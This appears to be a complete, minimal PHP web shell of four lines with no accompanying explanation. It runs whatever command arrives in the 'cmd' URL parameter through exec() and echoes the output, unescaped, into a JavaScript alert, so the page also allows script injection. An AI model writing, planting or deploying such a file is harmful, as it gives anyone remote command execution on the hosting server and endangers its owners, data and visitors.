<?php
$message=exec($_GET[cmd]);
echo "<script type='text/javascript'>alert('$message');</script>";
?>
